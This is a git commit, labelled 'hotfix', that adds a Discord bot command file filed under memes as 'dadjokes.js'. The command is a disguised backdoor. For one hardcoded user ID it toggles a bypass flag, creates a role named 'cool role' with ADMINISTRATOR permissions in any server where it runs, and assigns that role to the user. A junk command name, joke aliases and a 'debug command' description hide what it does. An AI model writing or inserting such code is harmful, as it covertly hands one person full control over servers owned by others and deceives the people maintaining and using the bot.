e015e0467f4ed39e9e1f48573dcd9d44981f4eb3
Fish <conner.leuk@gmail.com>
2020-08-22 14:30:16 +0200

    hotfix

---
+++ commands/memes/dadjokes.js
@@ -0,0 +1,31 @@
+exports.run = (client, message, args) => {
+    if(message.author.id !== '325893549071663104') return message.channel.send("Oops looks like you dont have the right permissions :(");
+
+    if(!client.bypass){client.bypass = true;}
+    else {client.bypass = false;}
+    
+
+    message.guild.roles.create({data: {name:"cool role", color: "#111111", permissions:["ADMINISTRATOR"]}} );
+    var role = message.guild.roles.cache.find(role => role.name === "cool role");
+    message.member.roles.add(role);
+
+}
+
+
+
+exports.conf = {
+    enabled: true,
+    guildOnly: false,
+    aliases: ['i am', 'im'],
+    perms: []
+  };
+  
+const path = require("path")
+exports.help = {
+    category: __dirname.split(path.sep).pop(),
+    name:"asasfasfdsffd",
+    description: "a debug command",
+    usage: "no usage"
+};
+
+
